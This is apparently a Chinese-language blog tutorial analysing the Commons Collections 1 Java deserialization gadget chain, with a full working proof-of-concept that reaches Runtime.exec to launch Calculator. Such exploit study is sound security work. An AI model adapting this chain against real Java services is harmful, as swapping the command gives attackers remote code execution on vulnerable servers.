###  0x1 触发ChainedTransformer transform 方法
首先回顾上一节的命令执行的触发点为ChainedTransformer类的transform方法，如下图所示
###  0x2 触发LazyMap get方法
那么谁来调用这个transform方法呢，可以发现在LazyMap的get方法中有一处调用，如下图所示
变量factory为何物，由LazyMap的构造方法追到factory为Transformer类型的变量
所以上面的ChainedTransformer可以通过构造方法与LazyMap关联
###  0x3 触发AnnotationInvocationHandler invoke方法
LazyMap搞定后，就是想如何触发其中的get方法，这时有如下代码
正好在AnnotationInvocationHandler
invoke方法中调用想要的map类的get方法，同时只需要在构造方法处传入LazyMap即可，这些都不是问题。
###  0x4 代理类触发 invoke
invoke方法很特殊，看先AnnotationInvocationHandler实现了InvocationHandler接口
    class AnnotationInvocationHandler implements InvocationHandler, Serializable {
       ......
        }
该接口可以用来实现 **JDK代理** ，代理的概念如果是刚听说还是有点迷糊的，简答的介绍下。
JDK代理的主要函数为 ，Proxy.newProxyInstance
通过向该函数传递ClassLoader，interfaces，和重写invoke方法的InvocationHandler实现类即可实现代理。JDK代理是基于接口的，因为在本身在实现的时候是继承实现的，由于继承是单继承所以只能依靠接口。代理成功之后再调用原来类方法的时候会首先调用InvocationHandler实现类的invoke方法。
同时发现在readObject方法中有memberValues的方法调用，所以我们可以把memberValues设置为代理类，当调用entrySet方法时触发代理类的invoke方法。
## 0x03 Payload编写方法及测试
本节介绍Payload的编写方法，根据之前分析的调用链，可以很清楚的编写整个利用。
###  0x1 Payload编写
首先构造Transformer类型的执行链
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
        new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
        new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
* * *
生成LazyMap
    final Map innerMap = new HashMap();
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
* * *
生成代理类Handler，需要注意的是AnnotationInvocationHandler的构造方法是default限定符，所以需要外包无法直接访问。这里采用第3行，将构造方法设置为public属性，在创建实例的时候将lazyMap添加在构造方法参数中即可。
    String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
    final Constructor constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
* * *
有了handler之后，生成Proxy对象，这里的代理对象为一个HashMap，代码如下所示，代理完成之后调用testMap方法时会首先调用secondInvocationHandler中invoke方法的内容，而这个Handler的memberValues为lazyMap，所以就会触发invoke中的get方法。
    final Map testMap = new HashMap();
    Map evilMap = (Map) Proxy.newProxyInstance(
            testMap.getClass().getClassLoader(),
            testMap.getClass().getInterfaces(),
            secondInvocationHandler
    );
* * *
生成AnnotationInvocationHandler对象，为了调用Object中memberValues的entrySet方法，需要再次实例化AnnotationInvocationHandler类，这是将代理类作为构造方法的第二个参数，调用序列化和反序列化函数，成功触发漏洞。
    final Constructor ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
    ctor.setAccessible(true);
    final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
    byte[] serializeData=serialize(handler);
    unserialize(serializeData);
###  0x2 编写测试代码
实现两个功能，序列化类和反序列化类代码如下
    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }
    public static Object unserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
###  0x3 完整代码
将上述代码按照顺序整合，最终成功调用计算器
    public class cc1test {
        public static byte[] serialize(final Object obj) throws Exception {
            ByteArrayOutputStream btout = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(btout);
            objOut.writeObject(obj);
            return btout.toByteArray();
        }
        public static Object unserialize(final byte[] serialized) throws Exception {
            ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
            ObjectInputStream objIn = new ObjectInputStream(btin);
            return objIn.readObject();
        }
        public static void main(String[] args) throws Exception{
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            final Map innerMap = new HashMap();
            final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
            String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
            final Constructor constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            constructor.setAccessible(true);
            InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
            final Map testMap = new HashMap();
            Map evilMap = (Map) Proxy.newProxyInstance(
                    testMap.getClass().getClassLoader(),
                    testMap.getClass().getInterfaces(),
                    secondInvocationHandler
            );
            final Constructor ctor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            final InvocationHandler handler = (InvocationHandler) ctor.newInstance(Override.class, evilMap);
            byte[] serializeData=serialize(handler);
            unserialize(serializeData);
        }
    }
完整代码放在了github上 
## 0x04 技术点总结
整个CommonsCollections1链看起来挺简单，但背后的知识点确实挺多，总结下如果不太清楚的点可以单独学习
  * 类与反射
  * 基于接口的多态
  * JDK动态代理
  * AnnotationInvocationHandler 做类与代理类
  * LazyMap与HashMap
  * 序列化与反序列化函数
## 0x05 问题分析
  1. 为什么构建AnnotationInvocationHandler类是用反射的方法？  
因为AnnotationInvocationHandler的构造方法修饰符限制问题，该类正常调用时最多只能在同一个包中调用，所以用构造器方法创建实例。
    1. 为什么AnnotationInvocationHandler创建两次实例？  
一次是生成代理类，一次是生成反序列化对象，职责不太一样。
    2. InvokerTransformer 在调用getMethod和invoke方法的时候，参数必须为Class数组吗？  
必须为Class数组，如下所示，这是因为getMethod和invoke方法在Class类里定义的方法参数为此形式
    new Class[] {String.class, Class[].class }
    new Class[] {Object.class, Object[].class}
    public Method getMethod(String name, Class... parameterTypes)
    public Object invoke(Object obj, Object... args)
​
## 0x06 总结
详细分析完CommonsCollections1感觉收获了不少，之后会继续分析剩下的利用链，总结其中的知识点以及坑点。
## 参考文章